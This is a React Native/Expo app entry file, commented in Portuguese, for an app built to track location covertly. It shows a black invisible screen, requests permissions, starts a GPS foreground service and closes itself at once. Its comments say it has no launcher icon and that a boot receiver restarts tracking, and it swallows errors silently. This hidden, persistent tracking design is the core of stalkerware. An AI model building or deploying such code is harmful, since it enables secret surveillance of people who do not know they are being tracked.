import { registerRootComponent } from 'expo';
import { useEffect } from 'react';
import { View, BackHandler } from 'react-native';
import { startLocationTracking } from './src/background-task';
import { requestPermissions } from './src/location-service';

/**
 * Activity invisível — abre, inicia o serviço GPS e fecha imediatamente.
 * O foreground service continua rodando em background após o fechamento.
 * Não há ícone no launcher (ver plugin with-no-launcher-icon.js).
 */
function App() {
  useEffect(() => {
    (async () => {
      try {
        const granted = await requestPermissions();
        if (granted) {
          await startLocationTracking();
        }
      } catch (_) {
        // silencioso — o boot receiver vai reiniciar na próxima vez
      } finally {
        // Fecha a activity. O foreground service continua rodando.
        BackHandler.exitApp();
      }
    })();
  }, []);

  // Tela preta enquanto o serviço inicializa (~1s), depois fecha sozinha
  return <View style={{ flex: 1, backgroundColor: '#000000' }} />;
}

registerRootComponent(App);
